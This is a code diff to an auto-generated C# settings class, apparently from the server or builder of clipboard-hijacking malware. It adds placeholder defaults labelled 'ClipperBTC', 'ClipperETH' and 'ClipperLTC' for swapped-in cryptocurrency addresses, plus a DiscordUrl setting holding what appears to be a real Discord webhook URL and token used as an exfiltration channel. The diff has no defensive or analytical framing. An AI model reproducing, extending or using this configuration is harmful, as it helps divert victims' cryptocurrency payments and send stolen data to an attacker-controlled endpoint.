@@ -265,7 +265,7 @@ namespace Server.Properties {
         
         [global::System.Configuration.UserScopedSettingAttribute()]
         [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
-        [global::System.Configuration.DefaultSettingValueAttribute("")]
+        [global::System.Configuration.DefaultSettingValueAttribute("--- ClipperBTC ---")]
         public string BtcAddr {
             get {
                 return ((string)(this["BtcAddr"]));
@@ -277,7 +277,7 @@ namespace Server.Properties {
         
         [global::System.Configuration.UserScopedSettingAttribute()]
         [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
-        [global::System.Configuration.DefaultSettingValueAttribute("")]
+        [global::System.Configuration.DefaultSettingValueAttribute("--- ClipperETH ---")]
         public string EthAddr {
             get {
                 return ((string)(this["EthAddr"]));
@@ -289,13 +289,26 @@ namespace Server.Properties {
         
         [global::System.Configuration.UserScopedSettingAttribute()]
         [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
-        [global::System.Configuration.DefaultSettingValueAttribute("")]
+        [global::System.Configuration.DefaultSettingValueAttribute("--- ClipperLTC ---")]
         public string LtcAddr {
             get {
                 return ((string)(this["LtcAddr"]));
             }
             set {
                 this["LtcAddr"] = value;
+            }
+        }
+        
+        [global::System.Configuration.UserScopedSettingAttribute()]
+        [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
+        [global::System.Configuration.DefaultSettingValueAttribute("https://discord.com/api/webhooks/1016614786533969920/fMJOOjA1pZqjV8_s0JC86KN9Fa0F" +
+            "eGPEHaEak8WTADC18s5Xnk3vl2YBdVD37L0qTWnM")]
+        public string DiscordUrl {
+            get {
+                return ((string)(this["DiscordUrl"]));
+            }
+            set {
+                this["DiscordUrl"] = value;
             }
         }
     }
